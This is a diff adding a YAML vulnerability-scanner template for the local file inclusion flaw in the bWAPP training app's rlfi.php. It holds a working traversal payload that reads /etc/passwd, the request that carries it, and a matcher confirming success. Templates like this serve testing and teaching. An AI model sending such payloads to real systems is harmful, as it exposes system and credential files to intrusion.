@@ -1,0 +1,34 @@
+id: bwapp-local-file-inclusion
+info:
+  name: Local File Inclusion (RFI/LFI) in rlfi.php language parameter
+  severity: high
+  description: >
+    The language parameter of rlfi.php is passed to a PHP include()/file read
+    without validation, so a traversal path reads arbitrary local files such as
+    /etc/passwd (and the same sink enables remote file inclusion).
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  cwe: CWE-98
+  tags: [lfi, rfi, disclosure, inclusion]
+variables:
+  - name: target
+    required: true
+  - name: cookie
+    required: true
+  - name: payload
+    default: "../../../../../../etc/passwd"
+steps:
+  - http:
+      method: GET
+      url: "{{target}}/rlfi.php?language={{url_encode(payload)}}&action=go"
+      headers:
+        Cookie: "{{cookie}}"
+      matchers:
+        - type: regex
+          part: body
+          regex: "root:.*:0:0:"
+success:
+  all:
+    - type: regex
+      part: body
+      regex: "root:.*:0:0:"
